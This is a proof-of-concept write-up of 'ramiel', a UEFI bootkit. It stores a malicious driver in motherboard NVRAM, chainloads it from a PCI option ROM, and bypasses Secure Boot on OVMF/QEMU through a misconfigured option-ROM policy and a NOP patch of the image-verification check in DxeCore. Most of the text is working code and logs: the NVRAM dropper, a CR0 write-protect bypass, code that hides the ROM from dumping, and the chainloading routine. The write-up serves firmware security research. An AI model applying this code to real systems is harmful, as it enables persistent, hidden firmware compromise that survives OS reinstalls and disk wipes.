RAMIEL POC WRITEUP
0xwillow, jan 2023

uefi diskless persistence technique + OVMF secureboot bypass


<========================================================================================>
abstract:

    the majority of UEFI bootkits persist within the EFI system partition.
    disk persistence is not ideal as it is easily detectable and cannot survive OS
    re-installations and disk wipes. furthermore, for almost all platforms, secureboot is
    configured to check the signatures of images stored on disk before they are loaded.

    more recently, a new technique [6] of persisting in the option rom of PCI cards was
    discovered. the technique allowed bootkits to survive OS re-installations and disk
    wipes. in the past, edk2 configured secureboot to allow unsigned option ROMs to
    execute [8], but this has since been patched for most platforms.
    PCI option rom persistence is not without limitations:
        1. PCI option rom is often small, usually within the range of ~32 - ~128 KB,
           providing little room for complex malware.
        2. PCI option rom can be trivially dumped as it is mapped into memory.

    ramiel attempts to mitigate these flaws. leveraging motherboard NVRAM, it can utilize
    ~256 KB of persistent storage on certain systems, which is greater than what current
    option rom bootkits can utilize.
    it is also difficult to detect ramiel since it prevents option roms from being
    mapped into memory, and as vault7 [7] states:
    "there is no way to enumerate NVRAM variables from the OS... you have to know the
    exact GUID and name of the variable to even determine that it exists."
    additionally, due to a misconfiguration in OVMF, ramiel is able to bypass secureboot
    for certain hypervisors.

<========================================================================================>
implementation details:

0. overview:
------------------------------------------------------------------------------------------
|                                     0.1 overview                                       |
------------------------------------------------------------------------------------------
the order in which sections are presented is the order in which ramiel performs
operations.

1. infection:
1.1 ramiel writes a malicious driver to NVRAM
1.2 ramiel writes chainloader to PCI option rom

2. subsequent boots:
2.3 ramiel patches secureboot check in LoadImage to chainload unsigned malicious driver
2.4 ramiel prevents oprom from being mapped into memory by linux kernel
2.5 ramiel loads the malicious driver from NVRAM


misc:
2.1 OVMF misconfiguration allows for unsigned PCI option roms to execute with secureboot
    enabled
2.2 overview of PCI device driver model
2.6 source debugging OVMF with gdb

------------------------------------------------------------------------------------------
|                                    0.2 bare metal                                      |
------------------------------------------------------------------------------------------
ramiel has not been tested on bare metal although theoretically it should work
with secureboot disabled.


1. infection:
------------------------------------------------------------------------------------------
|                                      1.1 NVRAM                                         |
------------------------------------------------------------------------------------------
on the version of OVMF tested, QueryVariableInfo returned:
    max variable storage:         262044 B, 262 KB
    remaining variable storage:   224808 B, 224 KB
    max variable size:            33732  B,  33 KB

in order to utilize all of 262 KB of NVRAM, the malicious driver must be broken into 33 KB
chunks stored in separate NVRAM variables. since the size of the malicious driver
is unknown to the chainloader, ramiel creates a variable called "guids" storing
the guids of all chunk variables. the guid of the "guids" variable is fixed at
compile time.

runtime.c excerpt:
``
    struct stat stat;
    int fd = open(argv[3], O_RDONLY);
    fstat(fd, &stat);

    uint8_t *buf = malloc(stat.st_size);
    read(fd, buf, stat.st_size);

    int attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | \
                     EFI_VARIABLE_RUNTIME_ACCESS;
    efi_guid_t guid;
    efi_str_to_guid(argv[1], &guid);
    ret = efi_set_variable(guid, argv[2], buf, stat.st_size, attributes, 777);
    if (ret != 0) {
        return -1;
    }
``

dropper excerpt:
``
    guids = []
    with open(sys.argv[1], "rb") as f:
        chunk = f.read(MAXVARSIZE)
        while chunk:
            with open("chunk", "wb") as f_:
                f_.write(chunk)
                guid = uuid.uuid4()
                guids.append(guid)
                os.system(f"./runtime {str(guid)} {str(guid).upper()} chunk")
            chunk = f.read(MAXVARSIZE)

    with open("guids", "w", encoding="utf-16-le") as f:
        for guid in guids:
            f.write(str(guid).upper())
        os.system(f"./runtime bfb35f7e-fc44-41ae-7cd9-68a80102b9d0 guids guids")
``


to write the variables to NVRAM, ramiel uses the libefivar library and its wrapper
for the UEFI runtime service SetVariable:
``
        int efi_set_variable(efi_guid_t guid,
                             const char *name,
                             void *data,
                             size_t data_size,
                             uint32_t attributes);
``

ramiel sets the attributes:
    EFI_VARIABLE_NON_VOLATILE to store the variable in NVRAM,
    EFI_VARIABLE_BOOTSERVICE_ACCESS so the chainloader may access it, and
    EFI_VARIABLE_RUNTIME_ACCESS to ensure the variable has been written.

importantly, EFI_VARIABLE_RUNTIME_ACCESS is unset during subsequent boots to prevent the
variable from being dumped from the OS even if its guid is known.

------------------------------------------------------------------------------------------
|                       1.2 PCI option rom emulation in QEMU                             |
------------------------------------------------------------------------------------------
option rom emulation is qemu is as simple as passing a romfile= param to a
emulated NIC device like so [1]:

``
    -device e1000e,romfile=chainloader.efirom
``

for bare metal, it is usually possible to flash PCI option rom via OEM
firmware update utilities like Intel Ethernet Flash Firmware Utility [9].

ramiel currently does not implement utilizing such utilities to infect virtual
machines that are passed healthy romfiles. ramiel requires an infected romfile to be
passed to qemu.


2. subsequent boots:
------------------------------------------------------------------------------------------
|                        2.1 OVMF policy misconfiguration                                |
------------------------------------------------------------------------------------------
option rom verification behavior is controlled by a PCD value
PcdOptionRomImageVerificationPolicy in the edk2 SecurityPkg package.
the possible values for the PCD are:
``
    ## Pcd for OptionRom.
      #  Image verification policy settings:
      #  ALWAYS_EXECUTE                         0x00000000
      #  NEVER_EXECUTE                          0x00000001
      #  ALLOW_EXECUTE_ON_SECURITY_VIOLATION    0x00000002
      #  DEFER_EXECUTE_ON_SECURITY_VIOLATION    0x00000003
      #  DENY_EXECUTE_ON_SECURITY_VIOLATION     0x00000004
      #  QUERY_USER_ON_SECURITY_VIOLATION       0x00000005
    gEfiSecurityPkgTokenSpaceGuid.PcdOptionRomImageVerificationPolicy|0x00|UINT32|-
    0x00000001
``

microsoft recommends platforms to set this value to
DENY_EXECUTE_ON_SECURITY_VIOLATION (0x04) [8], however, on the latest version of
edk2 the PCD is set to always execute for many OVMF platforms:
``
    OvmfPkg/OvmfPkgIa32X64.dsc:653:
        gEfiSecurityPkgTokenSpaceGuid.PcdOptionRomImageVerificationPolicy|0x00
    OvmfPkg/AmdSev/AmdSevX64.dsc:525:
        gEfiSecurityPkgTokenSpaceGuid.PcdOptionRomImageVerificationPolicy|0x00
    OvmfPkg/IntelTdx/IntelTdxX64.dsc:512:
        gEfiSecurityPkgTokenSpaceGuid.PcdOptionRomImageVerificationPolicy|0x00
    OvmfPkg/XenPlatformPei/XenPlatformPei.inf:90:
        gEfiSecurityPkgTokenSpaceGuid.PcdOptionRomImageVerificationPolicy
...
    OvmfPkg/Microvm/MicrovmX64.dsc:620:
        gEfiSecurityPkgTokenSpaceGuid.PcdOptionRomImageVerificationPolicy|0x00
    OvmfPkg/OvmfPkgIa32.dsc:641:
        gEfiSecurityPkgTokenSpaceGuid.PcdOptionRomImageVerificationPolicy|0x00
    OvmfPkg/Bhyve/BhyveX64.dsc:562:
        gEfiSecurityPkgTokenSpaceGuid.PcdOptionRomImageVerificationPolicy|0x00
    OvmfPkg/CloudHv/CloudHvX64.dsc:622:
        gEfiSecurityPkgTokenSpaceGuid.PcdOptionRomImageVerificationPolicy|0x00
    OvmfPkg/OvmfXen.dsc:508:
        gEfiSecurityPkgTokenSpaceGuid.PcdOptionRomImageVerificationPolicy|0x00
    OvmfPkg/OvmfPkgX64.dsc:674:
        gEfiSecurityPkgTokenSpaceGuid.PcdOptionRomImageVerificationPolicy|0x00
``

ramiel leverages this to bypass secureboot on qemu.

------------------------------------------------------------------------------------------
|                               2.2 PCI driver structure                                 |
------------------------------------------------------------------------------------------
during the dxe phase of EFI, the driver dispatcher will discover and dispatch all drivers
it encounters, including drivers stored in PCI option rom.

from edk2 docs::
"Drivers that follow the UEFI driver model are not allowed to touch any hardware in their
driver entry point. In fact, these types of drivers do very little in their
driver entry point. They are required to register protocol interfaces in the
Handle Database and may also choose to register HII packages in the HII Database..." [13]

register driver binding protocol in DriverEntry:
``
    EFI_DRIVER_BINDING_PROTOCOL gTestDriverBinding = {
        DriverSupported,        DriverStart, DriverStop,
        0x01, NULL,        NULL};

    EFI_STATUS EFIAPI DriverEntry(IN EFI_HANDLE ImageHandle,
                                  IN EFI_SYSTEM_TABLE* SystemTable) {
        gST = SystemTable;
        gBS = SystemTable->BootServices;
        gRT = SystemTable->RuntimeServices;
        gImageHandle = ImageHandle;

        EFI_STATUS status;
        status = EfiLibInstallDriverBindingComponentName2(
                    ImageHandle,         // ImageHandle
                    SystemTable,         // SystemTable
                    &gTestDriverBinding, // DriverBinding
                    ImageHandle,         // DriverBindingHandle
                    NULL, NULL);
        return status;
    }
``

from edk2 docs:
"A PCI driver must implement the EFI_DRIVER_BINDING_PROTOCOL containing the
Supported(), Start(), and Stop() services. The Supported() service evaluates the
ControllerHandle passed in to see if the ControllerHandle represents a PCI device the
PCI driver can manage." [14]

driver supported:
``
    BOOLEAN Checke1000eNIC(EFI_HANDLE Controller,
                           EFI_DRIVER_BINDING_PROTOCOL **This) {
        EFI_STATUS status = EFI_SUCCESS;
        EFI_PCI_IO_PROTOCOL *PciIo;

        PCI_TYPE00 Pci;
        status = gBS->OpenProtocol(Controller, &gEfiPciIoProtocolGuid,
                                   (VOID **) &PciIo, (*This)->DriverBindingHandle,
                                   Controller, EFI_OPEN_PROTOCOL_BY_DRIVER);
        if (EFI_ERROR(status) || PciIo == NULL) {
            return FALSE;
        }
        status = PciIo->Pci.Read(PciIo,                       // (protocol, device)
                                                              // handle
                                 EfiPciIoWidthUint32,         // access width & copy
                                                              // mode
                                 0,                           // Offset
                                 sizeof Pci / sizeof(UINT32), // Count
                                 &Pci                         // target buffer
        );


        gBS->CloseProtocol(Controller, &gEfiPciIoProtocolGuid,
                           (*This)->DriverBindingHandle, Controller);

        if (status == EFI_SUCCESS) {
            if (Pci.Hdr.VendorId == 0x8086 && Pci.Hdr.DeviceId == 0x10d3) {
                return TRUE;
            } else {
                return FALSE;
                }
            }
        return FALSE;
    }

    EFI_STATUS
    EFIAPI
    DriverSupported(IN EFI_DRIVER_BINDING_PROTOCOL *This, IN EFI_HANDLE Controller,
                    IN EFI_DEVICE_PATH_PROTOCOL *RemainingDevicePath) {

        EFI_DEVICE_PATH_PROTOCOL *this = DevicePathFromHandle(Controller);
        if (this == NULL) {
            return EFI_UNSUPPORTED;
        }

        CHAR16 *p = ConvertDevicePathToText(this, TRUE, FALSE);

        if (Checke1000eNIC(Controller, &This)) {
            Print(L"[ramiel]: nic found @ DevicePath: %s\n", p);
            return EFI_SUCCESS;
        } else {
            return EFI_UNSUPPORTED;
        }
    }
``

------------------------------------------------------------------------------------------
|                            2.3 patching secureboot check                               |
------------------------------------------------------------------------------------------
originally, ramiel utilized a manual mapper similar to shim to chainload the
malicious driver without triggering a secureboot violation.
however, it is far simpler to bypass secureboot by patching a check in DxeCore.efi
with nops.

when LoadImage is called on an unsigned image, the debug log in qemu will show
this message:
``
    [Security] 3rd party image[0] can be loaded after EndOfDxe: MemoryMapped(0x0, ...
    DxeImageVerificationLib: Image is not signed and SHA256 hash of image is not found
    in DB/DBX.
    The image doesn't pass verification: MemoryMapped(0x0,0x7D632000,0x7D6340C0)
``

the message is printed by DxeImageVerificationHandler in
SecurityPkg/Library/DxeImageVerificationLib/DxeImageVerificationLib.c:
``
1658>    EFI_STATUS
         EFIAPI
         DxeImageVerificationHandler (
...

1854>        DEBUG((DEBUG_INFO, "DxeImageVerificationLib: \
                    Image is not signed and %s hash of image is not found in DB/DBX.\n",
                    mHashTypeStr));
...
``

setting a breakpoint at DxeImageVerificationHandler entry and backtracing shows:
``
    Thread 1 hit Breakpoint 1, DxeImageVerificationHandler ...
    (gdb) bt
    #0  DxeImageVerificationHandler ...
    #1  0x000000007e2af95b in ExecuteSecurity2Handlers ...
    #2  ExecuteSecurity2Handlers ...
    #3  0x000000007e27b22d in Security2StubAuthenticate ...
    #4  0x000000007ef94dee in CoreLoadImageCommon.constprop.0 ...
        at ... edk2/MdeModulePkg/Core/Dxe/Image/Image.c:1273
    #5  0x000000007ef7b88e in CoreLoadImage ...
        at ... edk2/MdeModulePkg/Core/Dxe/Image/Image.c:1542
...
``

ramiel patches this check in CoreLoadImageCommon with nops.

MdeModulePkg/Core/Dxe/Image/Image.c:
``
1136>    EFI_STATUS
         CoreLoadImageCommon (
...

1269>    if (gSecurity2 != NULL) {
         SecurityStatus = gSecurity2->FileAuthentication (
                                      gSecurity2,
                                      OriginalFilePath,
                                      FHand.Source,
                                      FHand.SourceSize,
                                      BootPolicy
                                      );
...

1310>    if (EFI_ERROR (SecurityStatus) && (SecurityStatus != EFI_SECURITY_VIOLATION)) {
             if (SecurityStatus == EFI_ACCESS_DENIED) {
               *ImageHandle = NULL;
             }
             Status = SecurityStatus;
             Image  = NULL;
             goto Done;
         }
1322>
...
``

it is possible to find the address corresponding to a line of code via
setting hardware breakpoints.
setting hardware breakpoints at lines 1269 and 1322 shows the start and end
addresses of the code which ramiel must patch. as there is no ASLR, these
addresses do not change unless DxeCore.efi is recompiled.

``
    hw breakpoint  keep y   <MULTIPLE>
                    y   0x000000007ef94dbd in CoreLoadImageCommon.constprop.0 at
                         ... edk2/MdeModulePkg/Core/Dxe/Image/Image.c:1269 inf 1
    hw breakpoint  keep y   <MULTIPLE>
                    y   0x000000007ef94eab in CoreLoadImageCommon.constprop.0 at
                        ... edk2/MdeModulePkg/Core/Dxe/Image/Image.c:1327 inf 1
``

disassembly of check in CoreLoadImageCommon.constprop.0 before patch_sb:
``
    0x000000007ef94dbd <+2721>:	48 8b 05 84 d2 00 00	mov    0xd284(%rip),%rax
    0x000000007ef94dc4 <+2728>:	48 85 c0	            test   %rax,%rax
    0x000000007ef94dc7 <+2731>:	74 6d	                je     0x7ef94e36
    ...
    0x000000007ef94e9f <+2947>:	48 c7 00 00 00 00 00	movq   $0x0,(%rax)
    0x000000007ef94ea6 <+2954>:	e9 90 03 00 00	        jmp    0x7ef9523b
    0x000000007ef94eab <+2959>:	48 83 ec 20	            sub    $0x20,%rsp
``

any write protection implemented via pagetables is bypassed trivially with the
cr0 WP bit trick:
``
    void clear_cr0_wp() {
        AsmWriteCr0(AsmReadCr0() & ~(1UL << 16));
    }

    void set_cr0_wp() {
        AsmWriteCr0(AsmReadCr0() | (1UL << 16));
    }
``

it is possible to pattern scan memory for the check after finding the base
address of DxeCore.efi via enumerating ImageHandles in the handle database.
ramiel simply hardcodes the start and end address of where it should patch:
``
    #define PATCH_START 0x000000007ef94dbdu
    #define PATCH_END 0x000000007ef94eabu
...
    void patch_sb() {
        clear_cr0_wp();
        SetMem((VOID *) PATCH_START, PATCH_END - PATCH_START, 0x90);
        set_cr0_wp();
    }
``

disassembly of check in CoreLoadImageCommon.constprop.0 after patch_sb:
``
    0x000000007ef94dbd <+2721>:	nop
    0x000000007ef94dbe <+2722>:	nop
    0x000000007ef94dbf <+2723>:	nop
    ...
    0x000000007ef94ea9 <+2957>:	nop
    0x000000007ef94eaa <+2958>:	nop
    0x000000007ef94eab <+2959>:	sub    $0x20,%rsp
``

ramiel calls LoadImage successfully on an unsigned image:
qemu debug log:
``
    Loading driver at 0x0007D62F000 EntryPoint=0x0007D63045A helloworld_driver.efi
    InstallProtocolInterface: BC62157E-3E33-4FEC-9920-2D3B36D750DF 7D635798
    ProtectUefiImageCommon - 0x7D635940
      - 0x000000007D62F000 - 0x00000000000020C0
``

------------------------------------------------------------------------------------------
|                               2.4 hide option rom                                      |
------------------------------------------------------------------------------------------
x86sec [1] demonstrated that PCI option roms can be trivially dumped:
``
    $ lspci -vv
    00:04.0 Ethernet controller: Intel Corporation 82574L Gigabit Network Connection
        Subsystem: Intel Corporation 82574L Gigabit Network Connection
...
        Region 0: Memory at c0860000 (32-bit, non-prefetchable) [size=128K]
        Region 1: Memory at c0840000 (32-bit, non-prefetchable) [size=128K]
        Region 2: I/O ports at 6060 [size=32]
        Region 3: Memory at c0880000 (32-bit, non-prefetchable) [size=16K]
        Expansion ROM at 80050000 [disabled] [size=32K]
        Capabilities: <access denied>
        Kernel driver in use: e1000e
        Kernel modules: e1000e
``

``
    $ cd /sys/devices/pci0000:00/0000:00:04.0
    $ echo 1 | sudo tee rom
    $ sudo dd if=rom of=/tmp/oprom.bin
    $ file /tmp/oprom.bin
    /tmp/oprom.bin: BIOS (ia32) ROM Ext. (56*512)
``

however, "There is a kernel boot parameter, pci=norom, that is intended to disable
the kernel's resource assignment actions for Expansion ROMs that do not already
have BIOS assigned address ranges." which "only works if the Expansion ROM BAR is
set to "0" by the BIOS before hand-off." [10]

in order to prevent optiom rom from being dumped, ramiel clears XROMBAR in the PCI
configuration header of the NIC and passes pci=norom to the kernel.

in DriverStart, ramiel opens the EFI_PCI_IO_PROTOCOL associated with the
NIC controller and passes it to clear_oprom_bar:
``
    EFI_PCI_IO_PROTOCOL *PciIo;
    status = gBS->OpenProtocol(Controller, &gEfiPciIoProtocolGuid,
                               (VOID **) &PciIo, This->DriverBindingHandle,
                               Controller, EFI_OPEN_PROTOCOL_BY_DRIVER);
    if (EFI_ERROR(status) || PciIo == NULL) {
       return status;
    }

    status = clear_oprom_bar(PciIo);
``

in clear_oprom_bar, ramiel writes all zeros to the XROMBAR register (offset
0x30 within the PCI configuration headers) of the controller:
``
    UINT32 allones = 0x00000000;
    status = PciIo->Pci.Write(PciIo,                      // protocol
                             EfiPciIoWidthUint32,         // access width
                             0x30,                        // offset of XROMBAR
                             1,                           // count
                             &allones                     // all zeros
    );
``

after, lspci no longer displays the expansion rom field and the rom cannot be
dumped without memory scanning:
``
    00:04.0 Ethernet controller: Intel Corporation 82574L Gigabit Network Connection
        Subsystem: Intel Corporation 82574L Gigabit Network Connection
...
        Region 0: Memory at c0860000 (32-bit, non-prefetchable) [size=128K]
        Region 1: Memory at c0840000 (32-bit, non-prefetchable) [size=128K]
        Region 2: I/O ports at 6060 [size=32]
        Region 3: Memory at c0880000 (32-bit, non-prefetchable) [size=16K]
        Capabilities: <access denied>
        Kernel driver in use: e1000e
        Kernel modules: e1000e
``

------------------------------------------------------------------------------------------
|                           2.5 reassemble chunks + chainload                            |
------------------------------------------------------------------------------------------
to reassemble the malicious driver image, ramiel first calls GetVariable on the "guids"
variable, then calls GetVariable on every guid stored in it and copies the chunks
to a buffer:
+TODO: remove runtime access flag from vars
``
    #define GUIDS_VAR_NAME L"guids"
    #define GUIDS_VAR_GUID {0xBFB35F7E, 0xFC44, 0x41AE, \
                           {0x7C, 0xD9, 0x68, 0xA8, 0x01, 0x02, 0xB9, 0xD0}}

...
    UINTN parse_guids(CHAR16 ***var_names_ptr, UINT8 *buf, UINTN bufsize) {
        UINTN nguids = (bufsize / sizeof(CHAR16)) / GUID_LEN;
        CHAR16 **guids = AllocateZeroPool(nguids * sizeof(CHAR16 *));
        *var_names_ptr = guids;

        for (UINTN i = 0; i < nguids; i++) {
            CHAR16 *tmp = AllocateZeroPool((GUID_LEN * sizeof(CHAR16)) + sizeof(CHAR16));
            guids[i] = tmp;
            CopyMem(tmp,
                    buf + (i * GUID_LEN * sizeof(CHAR16)), GUID_LEN * sizeof(CHAR16));
        }

        return nguids;
    }

    EFI_STATUS
    EFIAPI
    nvram_chainload() {
        EFI_STATUS status;

        UINT8 *buf;
        UINTN bufsize;
        EFI_GUID guids_var_guid = GUIDS_VAR_GUID;
        gRT->GetVariable(
            GUIDS_VAR_NAME,
            &guids_var_guid,
            NULL,
            &bufsize,
            NULL);

        buf = AllocateZeroPool(bufsize);

        gRT->GetVariable(
            GUIDS_VAR_NAME,
            &guids_var_guid,
            NULL,
            &bufsize,
            buf);

        CHAR16 **var_names;
        UINTN nguids = parse_guids(&var_names, buf, bufsize);

        EFI_GUID *guids = AllocateZeroPool(nguids * sizeof(EFI_GUID));

        for (int i = 0; i < nguids; i++) {
            StrToGuid(var_names[i], &guids[i]);
        }

        UINT64 size = 0;
        UINT64 *sizes = AllocateZeroPool(nguids * sizeof(UINT64));

        for (int i = 0; i < nguids; i++) {
            gRT->GetVariable(
                var_names[i],
                &(guids[i]),
                NULL,
                &(sizes[i]),
                NULL
            );
            size += sizes[i];
        }

        UINT8 *application_ptr = AllocatePages(EFI_SIZE_TO_PAGES(size));

        UINT64 offset = 0;
        for (int i = 0; i < nguids; i++) {
            gRT->GetVariable(
                var_names[i],
                &(guids[i]),
                NULL,
                &(sizes[i]),
                application_ptr + offset);
            offset += sizes[i];
        }

        MEMORY_DEVICE_PATH mempath = MemoryDevicePathTemplate;
        mempath.Node1.StartingAddress = (EFI_PHYSICAL_ADDRESS) (UINTN) application_ptr;
        mempath.Node1.EndingAddress = \
                               (EFI_PHYSICAL_ADDRESS) ((UINTN) application_ptr) + size;

        EFI_HANDLE NewImageHandle;
        status = gBS->LoadImage(
            0,
            gImageHandle,
            (EFI_DEVICE_PATH_PROTOCOL *) &mempath,
            application_ptr,
            size,
            &NewImageHandle);
        if (EFI_ERROR(status)) {
            return status;

        }

        status = gBS->StartImage(NewImageHandle, NULL, NULL);
        if (EFI_ERROR(status)) {
            return status;
        }

        return status;
    }
``

then it calls LoadImage on a memory device path pointing to the buffer [12]:
``
    typedef struct {
      MEMMAP_DEVICE_PATH          Node1;
      EFI_DEVICE_PATH_PROTOCOL    End;
    } MEMORY_DEVICE_PATH;

    STATIC CONST MEMORY_DEVICE_PATH  MemoryDevicePathTemplate =
    {
        {
            {
                HARDWARE_DEVICE_PATH,
                HW_MEMMAP_DP,
                {
                    (UINT8)(sizeof (MEMMAP_DEVICE_PATH)),
                    (UINT8)((sizeof (MEMMAP_DEVICE_PATH)) >> 8),
                },
            }, // Header
            0, // StartingAddress (set at runtime)
            0  // EndingAddress   (set at runtime)
        }, // Node1
        {
            END_DEVICE_PATH_TYPE,
            END_ENTIRE_DEVICE_PATH_SUBTYPE,
            { sizeof (EFI_DEVICE_PATH_PROTOCOL), 0 }
        } // End
    };
...
    MEMORY_DEVICE_PATH mempath = MemoryDevicePathTemplate;
    mempath.Node1.StartingAddress = (EFI_PHYSICAL_ADDRESS) (UINTN) application_ptr;
    mempath.Node1.EndingAddress = (EFI_PHYSICAL_ADDRESS) ((UINTN) application_ptr) + size;

    EFI_HANDLE NewImageHandle;
    status = gBS->LoadImage(
        0,
        gImageHandle,
        (EFI_DEVICE_PATH_PROTOCOL *) &mempath,
        application_ptr,
        size,
        &NewImageHandle);
``

com1 log:
``
    [ramiel]: nic found @ DevicePath: PciRoot(0x0)/Pci(0x4,0x0)
    [ramiel]: print_var_info - max_var_storage -> 262044 B
    [ramiel]: print_var_info - remaining_var_storage -> 224808 B
    [ramiel]: print_var_info - max_var_size -> 33732 B
    [ramiel]: DriverStart - vendor id, device id -> 8086, 10D3
    [ramiel]: DriverStart - xrombar -> 0
    [ramiel]: DriverStart - command register -> 7
    [ramiel]: patch_sb - patching secureboot check from -> 7EF94DBD to 7EF94EAB...
    [ramiel]: patch_sb - completed
    [ramiel]: nvram_chainload - guid 02015480-B875-42CC-B73C-7CD6D7A140D5
    [ramiel]: nvram_chainload - LoadImage of target completed
    helloworld !! : D
    [ramiel]: nvram_chainload - StartImage completed
``

------------------------------------------------------------------------------------------
|                           2.6 source debugging OVMF with gdb                           |
------------------------------------------------------------------------------------------
1. follow the debian wiki instructions to setup a vm with secureboot [15]
2. compile OVMF with -D SECURE_BOOT_ENABLE
3. copy OVMF_VARS.fd and OVMF_CODE.fd to the secureboot-vm directory
4. run:
    $ ./start-vm.sh
5. exit the vm, then run:
    $ ./gen_symbol_offsets.sh > gdbscript
    $ ./start-vm.sh -s -S
    $ gdb
    (gdb) source gdbscript
    (gdb) target remote localhost:1234

start-vm.sh [15]
``
    #!/bin/bash

    set -Eeuxo pipefail

    LOG="debug.log"
    MACHINE_NAME="disk"
    QEMU_IMG="${MACHINE_NAME}.img"
    SSH_PORT="5555"
    OVMF_CODE_SECURE="ovmf/OVMF_CODE_SECURE.fd"
    OVMF_VARS_ORIG="/usr/share/OVMF/OVMF_VARS_4M.ms.fd"
    OVMF_VARS_SECURE="ovmf/OVMF_VARS_4M_SECURE.ms.fd"

    if [ ! -e "${QEMU_IMG}" ]; then
            qemu-img create -f qcow2 "${QEMU_IMG}" 8G
    fi

    if [ ! -e "${OVMF_VARS}" ]; then
            cp "${OVMF_VARS_ORIG}" "${OVMF_VARS}"
    fi

    qemu-system-x86_64 \
            -enable-kvm \
            -cpu host -smp cores=4,threads=1 -m 2048 \
            -object rng-random,filename=/dev/urandom,id=rng0 \
            -device virtio-rng-pci,rng=rng0 \
            -net nic,model=virtio -net user,hostfwd=tcp::${SSH_PORT}-:22 \
            -name "${MACHINE_NAME}" \
            -drive file="${QEMU_IMG}",format=qcow2 \
            -vga virtio \
            -machine q35,smm=on \
            -global driver=cfi.pflash01,property=secure,value=on \
            -drive format=raw,file=fat:rw:fs1 \
            -drive if=pflash,format=raw,unit=0,file="${OVMF_CODE_SECURE}",readonly=on \
            -drive if=pflash,format=raw,unit=1,file="${OVMF_VARS_SECURE}" \
            -debugcon file:"${LOG}" -global isa-debugcon.iobase=0x402 \
            -global ICH9-LPC.disable_s3=1 \
            -serial file:com1.log \
            -device e1000e,romfile=chainloader.efirom \
            $@

``

gen_symbol_offsets.sh, adapted from [5]
``
    #!/bin/bash

    LOG="../debug.log"
    PEINFO="peinfo/peinfo"

    cat ${LOG} | grep Loading | grep -i efi | while read LINE; do
      BASE="`echo ${LINE} | cut -d " " -f4`"
      NAME="`echo ${LINE} | cut -d " " -f6 | tr -d "[:cntrl:]"`"
      EFIFILE="`find  <path to edk2>/Build/MdeModule/DEBUG_GCC5/X64 -name ${NAME} \
                -maxdepth 1 -type f`"
      if [ -z "$EFIFILE" ]
      then
          :
      else
          ADDR="`${PEINFO} ${EFIFILE} \
                | grep -A 5 text | grep VirtualAddress | cut -d " " -f2`"
          TEXT="`python -c "print(hex(${BASE} + ${ADDR}))"`"
          SYMS="`echo ${NAME} | sed -e "s/\.efi/\.debug/g"`"
          SYMFILE="`find <path to edk2>/Build/MdeModule/DEBUG_GCC5/X64 -name ${SYMS} \
                    -maxdepth 1 -type f`"
          echo "add-symbol-file ${SYMFILE} ${TEXT}"
      fi
    done
``

<========================================================================================>

references:
[1] https://x86sec.com/posts/2022/09/26/uefi-oprom-bootkit
[2] https://casualhacking.io/blog/2020/1/4/executing-custom-option-rom-on-\
    nucs-and-persisting-code-in-uefi-runtime-services
[3] https:// casualhacking.io/blog/2019/12/3/using-optionrom-to-overwrite-\
    smmsmi-handlers-in-qemu
[4] https://laurie0131.gitbooks.io/memory-protection-in-uefi-bios/content/\
    protection-for-pe-image-uefi.html
[5] https://retrage.github.io/2019/12/05/debugging-ovmf-en.html
[6] http://ftp.kolibrios.org/users/seppe/UEFI/Beyond_BIOS_Second_Edition_\
    Digital_Edition_(15-12-10)%20.pdf
[7] https://wikileaks.org/ciav7p1/cms/page_31227915.html
[8] https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/uefi-\
    validation-option-rom-validation-guidance?view=windows-10
[9] https://www.intel.com/content/www/us/en/support/articles/000005790/software/\
    manageability-products.html
[10] https://lkml.iu.edu/hypermail/linux/kernel/1509.2/06385.html
[11] https://edk2-docs.gitbook.io/understanding-the-uefi-secure-boot-chain/
[12] https://bsdio.com/edk2/docs/master/_boot_android_boot_img_8c_source.html
[13] https://edk2-docs.gitbook.io/edk-ii-uefi-driver-writer-s-guide/7_driver_entry_point/\
     72_uefi_driver_model
[14] https://edk2-docs.gitbook.io/edk-ii-uefi-driver-writer-s-guide/18_pci_driver_\
     design_guidelines/readme.3/1831_supported
[15] https://wiki.debian.org/SecureBoot/VirtualMachine
